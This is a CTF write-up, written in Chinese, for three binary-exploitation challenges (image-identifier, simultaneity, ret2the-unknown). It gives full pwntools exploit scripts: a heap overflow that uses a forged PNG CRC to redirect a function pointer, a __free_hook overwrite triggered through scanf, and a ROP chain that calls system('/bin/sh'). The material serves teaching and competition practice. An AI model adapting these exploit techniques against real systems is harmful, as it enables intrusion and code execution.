## image-identifier

> 题目漏洞不难，就是通过堆溢出修改函数指针到后门函数，难点就是在于逆向 updata_crc 和另外几个检查算法。

是一个解析图片的程序，首先匹配字符串来检查文件头是否符合标准，判断两个文件类型，修改全局标志位，后面进入对应的处理函数：

![image-20210722163338689](https://gitee.com/mrskye/Picbed/raw/master/img/20210722163345.png)

然后对中间部分进行 crc 校验。固定伪造 png 的 size 之后，将断点打在 updata_crc 抓取出当前 size 对应的 crc 校验码 ：

![image-20210722163528776](https://gitee.com/mrskye/Picbed/raw/master/img/20210722163531.png)

利用修改图片的功能，将位于高地址的堆块中的指针修改到后门。

write_deviation 是通过从文件中读取的数据修改过来的，可以控制部分数据，劫持这偏移地址。

写入内容是 updata_crc 的返回值，改造部分 png 数据，让 crc 返回值是 0x1818 写入 dword 劫持地址到后门。

![image-20210722173214642](../../Library/Application Support/typora-user-images/image-20210722173214642.png)

```python
#!/usr/bin/env python
# -*- coding:utf-8 -*-

from pwn import *
import sys

#--------------------------info-----------------------------
binary_path = "./chal"
local_libc_path = "/lib/x86_64-linux-gnu/libc.so.6"
remote_libc_path = "libc-2.23.so"

#--------------------------payload--------------------------
def payload():
    # with open("./1.png",'rb') as file:
    #     data = file.read()

    img_sz = 0x29
    pngHead = 0x0a1a0a0d474e5089
    checksum = 0x5ab9bc8a
    png = p64(pngHead) + b"\r" * (7)
    png += b"A"*( 0x1d - len(png) )
    png += p32(checksum)
    png += b"\x00"*3 + b"\x27"
    png += p32(0xb18)
    png += b"\x00" * (img_sz - len(png))

    # gdb.attach(p,"b *0x401A3F")

    p.sendlineafter("file?\n\n",str(len(png)))
    p.sendafter("here:\n\n",png)
    p.sendlineafter("colors?\n",'y')
    p.interactive()

#--------------------------main-----------------------------
if __name__ == '__main__':
    context.binary = ELF(binary_path)
    if sys.argv[1] == "r":
        p = remote("127.0.0.1",12000)
        elf = ELF(binary_path)
        libc = ELF(remote_libc_path)
    else:
        context.log_level='debug'
        context.terminal =['tmux','sp','-h']
        p = process(binary_path)
        elf = ELF(binary_path)
        libc = ELF(local_libc_path)
    payload()
```



## simultaneity

常规 mmap 分配堆块泄露 libc 地址、scanf 触发 malloc&free ，就是最后调试 scanf 发现调用 strtoull ，将字符串转换为数字，可以在写入内容前面加 `0` ，拼凑出足够长度让 scanf 申请 malloc ，达到写入的同时调用 free_hook

```python
from pwn import *
context.log_level='debug'
context.terminal=['tmux','sp','-h']

binary = context.binary = ELF('./simultaneity')

# p = process(binary.path)
# elf = ELF(binary.path)
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = process(["./ld-linux-x86-64.so.2", "./simultaneity"], env={"LD_PRELOAD":"./libc.so.6"})

p.sendlineafter("big?\n",str(10000000))
p.recvuntil('here: ')
heap_addr = int(p.recvline().strip(),16)
libc.address = heap_addr-(0x7f8458780010-0x7f845910a000)
log.info('libc.address: ' + hex(libc.address))
log.info('libc.sym.__free_hook: ' + hex(libc.sym.__free_hook))

gdb.attach(p,"b *$rebase(0x125C)")

p.sendlineafter("far?\n",str(0))
# p.sendlineafter("far?\n",str((libc.sym.__free_hook - heap_addr)//8))
# p.sendlineafter("what?\n",str(libc.address+0xe6c7e))
p.sendlineafter("what?\n",0x500*"0"+str(libc.address+0xe6c84))



p.interactive()
```

## ret2the-unknown

```python
from pwn import *


POP_RDI_RET = 0x00023a5f 
libc = ELF("./libc-2.28.so")

p = process("./ret2the-unknown", env={"LD_PRELOAD": "./libc-2.28.so"})

payload  = b"A" * (32+8)                           
payload += p64(0x401186)                              
log.info("Overwriting return address with main.")
p.recvuntil("safely?")
p.sendline(payload)

p.recvuntil("there: ")
printf_addr = p.recvuntil("luck!").decode("utf-8").split("\n")[0]

printf_addr   = int(printf_addr, 16)                   
libc.address  = printf_addr - libc.symbols["printf"]  
payload  = b"B" * (32+8)                      
payload += p64(libc.address + POP_RDI_RET)           
payload += p64(next(libc.search(b"/bin/sh")))       
payload += p64(libc.symbols["system"])               


p.recvuntil("safely?")
p.sendline(payload)

p.recvuntil("luck!")
p.interactive()
```

